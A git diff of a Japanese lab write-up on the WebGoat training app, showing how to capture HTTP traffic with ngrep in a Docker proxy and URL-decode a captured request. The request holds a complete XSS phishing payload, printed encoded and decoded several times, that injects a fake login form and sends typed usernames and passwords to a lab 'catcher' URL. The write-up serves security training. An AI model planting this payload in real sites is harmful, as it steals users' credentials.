@@ -92,20 +92,19 @@ http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <span></span>に対して、*U
 ### proxyサーバでHTTP通信をキャプチャ
 実際にどのようなことが起きているのかは、WEBサーバのログを取得しないとわからない。
 
-1. proxyサーバにログイン
-vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
-2. ngrepを使用してHTTP通信をキャプチャ
-root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
-3. proxyサーバをログアウト
-root@c56fe08a3ea2:/#
-4. ゲストOSでproxyサーバのcontainer IDを調べる
-vagrant@webgoat:~/apps$ sudo docker ps
-CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
-937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
-64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
-425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
-5. 取得したngrepのログをゲストOSにコピー
-vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
+1. proxyサーバにログイン  <br>
+vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash <br>
+2. ngrepを使用してHTTP通信をキャプチャ <br>
+root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log <br>
+3. proxyサーバをログアウト <br>
+4. ゲストOSでproxyサーバのcontainer IDを調べる <br>
+vagrant@webgoat:~/apps$ sudo docker ps <br>
+CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES <br>
+937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1 <br>
+64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1 <br>
+425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1 <br>
+5. 取得したngrepのログをゲストOSにコピー <br>
+vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log . <br>
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/ngrep.log)
 
@@ -118,7 +117,7 @@ X-Requested-With: XMLHttpRequest.
 ``Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search``    <br>
  <br>
 上記メッセージをnkfを使用してURLデコードすると、   <br>
-vagrant@webgoat:~$ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input    <br>
+$ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input   <br>
  <br>
 /// 悪意のあるスクリプトが送られていることがわかる。    <br>
 ``Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br><input+type="submit"+name="login"+value="login"+onclick="hack()"></form><br><br><HR>&SUBMIT=Search``<br>
@@ -132,10 +131,11 @@ X-Requested-With: XMLHttpRequest.
 ``Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%``   <br>
  <br>
 上記メッセージをnkfを使用してURLデコードすると、   <br>
-vagrant@webgoat:~$ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   <br>
+$ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   <br>
  <br>
 /// 悪意のあるスクリプトがWebGoatに送られていることがわかる。   <br>
 ``Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br%``<br>
+
 
 ## References
 * [OWASP Top 10 2013](https://www.owasp.org/images/7/79/OWASP_Top_10_2013_JPN.pdf)
